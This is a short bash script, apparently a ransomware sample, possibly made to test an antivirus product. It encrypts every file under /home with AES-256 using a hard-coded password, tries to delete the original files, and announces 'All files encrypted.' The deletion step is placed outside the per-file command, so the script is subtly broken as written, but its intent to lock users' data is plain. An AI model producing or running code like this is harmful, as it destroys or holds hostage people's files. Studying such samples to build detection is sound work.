#!/bin/bash
folder="/home" && password="hydradragonantivirushere"
[ ! -d "$folder" ] && echo "Folder does not exist." && exit 1
find "$folder" -type f -print0 | xargs -0 -I{} openssl enc -aes-256-cbc -in {} -out {}.enc -pass pass:$password && rm {}
echo "All files encrypted."